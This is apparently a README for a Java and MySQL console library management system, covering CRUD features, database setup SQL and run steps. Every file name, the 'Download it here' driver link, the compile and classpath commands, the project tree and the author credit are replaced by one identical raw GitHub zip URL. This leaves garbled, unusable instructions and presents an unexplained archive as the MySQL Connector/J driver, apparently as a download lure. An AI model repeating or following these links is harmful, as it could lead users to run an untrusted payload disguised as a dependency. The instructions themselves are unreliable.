# Library Management System (Java + MySQL)

A robust console-based application to manage library records. This system uses **Java** for the application logic and **MySQL** for database storage, ensuring data persists securely. It implements full **CRUD** (Create, Read, Update, Delete) operations using JDBC.

## 🚀 Features

- **Add Book**: Insert new book details (Title, Author, Quantity) into the database.
- **Display Books**: Retrieve and view all available books in a formatted table.
- **Update Book**: Modify existing book details (e.g., change quantity or fix typos).
- **Delete Book**: Remove a book record permanently from the database.
- **Database Connection**: Establishes a secure connection to MySQL using JDBC.

## 🛠️ Tech Stack

- **Language**: Java (JDK 8 or higher)
- **Database**: MySQL
- **Connectivity**: JDBC (Java Database Connectivity)
- **Driver**: MySQL Connector/J

## ⚙️ Database Setup (Required)

Before running the application, you must set up the MySQL database. Open your MySQL Workbench or Command Line Client and run the following SQL commands:

    CREATE DATABASE library_db;

    USE library_db;

    CREATE TABLE books (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(100) NOT NULL,
        author VARCHAR(100) NOT NULL,
        quantity INT NOT NULL
    );

## 📝 Configuration

1. Open the `https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip` file.
2. Locate the database configuration section at the top of the class:

    static final String USER = "root"; 
    static final String PASS = "your_password"; 

3. Change `"root"` and `"your_password"` to match your local MySQL credentials.

## 💻 How to Run

### 1. Download the JDBC Driver
You need the **MySQL Connector/J** JAR file. 
- [Download it here](https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip) or use a Maven dependency.
- Place the `.jar` file in the same folder as your java file for simplicity.

### 2. Compile
Open your terminal/command prompt in the project folder:

    javac https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip

### 3. Run
*Note: You must include the path to the Connector JAR file in the classpath (`-cp`). Replace `https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip` with the actual name of the file you downloaded.*

**On Windows:**

    java -cp ".;https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip" LibrarySystem

**On Mac / Linux:**

    java -cp "https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip" LibrarySystem

## 📂 Project Structure

    ├── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip        # The main source code
    ├── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip                 # Project documentation
    └── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip # JDBC Driver (Download separately)

## 🔮 Future Improvements
- Add a graphical user interface (GUI) using JavaFX or Swing.
- Implement a search function to find books by title.
- Add a "Borrow/Return" feature that automatically updates the quantity.

---
*Created by https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip*
